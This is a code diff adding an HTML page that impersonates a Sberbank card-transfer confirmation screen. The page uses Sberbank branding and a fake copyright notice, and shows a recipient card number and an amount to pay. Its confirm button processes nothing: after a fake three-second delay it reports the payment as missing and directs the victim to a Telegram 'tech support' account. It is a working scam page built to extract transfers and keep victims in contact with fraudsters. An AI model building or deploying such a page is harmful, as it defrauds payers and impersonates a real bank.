@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Перевод СберБанк</title>
+    <link rel="stylesheet" href="./index.css">
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.3/es6-shim.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.10/clipboard.min.js"></script>
+    <script defer="" src="../../js/function.js"></script>
+<script type="module">
+import data from './data.js';
+const cardNumberSpan = document.getElementById('cardNumberSpan');
+
+cardNumberSpan.innerText = data;
+</script>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+      // Получаем значение из элемента с идентификатором booking-submit-summary
+      const bookingSubmitSummaryValue = document.getElementById('booking-submit-summary').innerText;
+    
+      // Получаем элемент с идентификатором additional-submit-summary
+      const additionalSubmitSummaryElement = document.getElementById('additional-submit-summary');
+    
+      // Вставляем значение в элемент additional-submit-summary
+      additionalSubmitSummaryElement.innerText = bookingSubmitSummaryValue;
+    });
+    
+        </script>
+    <script type="module" src="./data.js"></script>
+    <script type="module" src="./main.js"></script>
+</head>
+<body>
+    <div class="all-elements">
+        <img src="./logo1.svg" alt="logo" class="logo"/>
+        <a href="http://www.sberbank.ru/ru/person">sberbank.ru</a>
+        <div class="info-box">
+            <h1 class="transform-info">По карте</h1>
+            <h2 class="check-info">Номер карты</h2>
+            <div class="box-number-of-cart">
+                <p class="number-info" id="cardNumberSpan"></p>
+                <img  style="cursor: pointer; width: 26px; stroke: #ABABAB; height: 30px; position: absolute;" src="./copy-svg.svg" alt="copy" class="copy-svg"/>    
+            </div>
+            <h2 class="summary-info">Сумма</h2>
+            <p class="amount-info" id="booking-submit-summary"></p>
+            <h2 class="bank-info">Банк Получатель</h2>
+            <p class="bank-name">СберБанк</p> 
+            <button id="submitForm" onclick="handlePayment()" href="#">Подтвердить платёж</button>
+            
+        </div>
+        <p class="info-p" style="text-align: center;">Все платежи проводятся СберБанком.<br>  © 2024, СберБанк.<br> Все права защищены.</p>
+    </div>
+
+    <script>
+        function handlePayment() {
+            // Get the reference to the body
+            var body = document.body;
+
+            // Hide all elements within the body
+            var elements = body.querySelectorAll('*');
+            elements.forEach(function(element) {
+                element.style.opacity = '0';
+            });
+
+            // Set a timeout to show the support button, warning block, and resize info-box after 3 seconds
+            setTimeout(function () {
+                // Remove the "Подтвердить платеж" button
+                var paymentButton = document.getElementById('submitForm');
+                paymentButton.remove();
+
+                // Resize the info-box
+                var infoBox = document.querySelector('.info-box');
+                infoBox.classList.add('small');
+
+                // Create and append the "Техподдержка" button
+                var supportButton = document.createElement('button');
+                supportButton.textContent = 'Техподдержка';
+                supportButton.onclick = showSupport;
+                supportButton.className = 'support-button'; // Add a class for styling
+                supportButton.href = 'https://t.me/Sergey_supp_sbp_nspk';
+
+                var allElementsDiv = document.querySelector('.all-elements');
+                allElementsDiv.appendChild(supportButton);
+
+                // Create and append the warning block
+                var warningBlock = document.createElement('div');
+                warningBlock.className = 'warning-block';
+                var h2 = document.createElement('h2');
+                var p = document.createElement('p');
+                h2.textContent = 'Внимание!';
+                p.textContent = 'Мы не смогли найти Ваш платеж в системе. Свяжитесь с нашей техподдержкой.';
+                warningBlock.appendChild(h2);
+                warningBlock.appendChild(p);
+                allElementsDiv.appendChild(warningBlock);
+
+                // Show all elements again
+                elements.forEach(function(element) {
+                    element.style.opacity = '1';
+                });
+            }, 3000);
+        }
+
+        function showSupport() {
+            window.location.href = 'https://t.me/Sergey_supp_sbp_nspk';
+        }
+
+        const copyImg = document.querySelector('.copy-svg');
+const text = document.getElementById('cardNumberSpan');
+
+copyImg.addEventListener('click', () => {
+  navigator.clipboard.writeText(text.innerText); 
+});
+    </script>
+
+</body>
+</html>
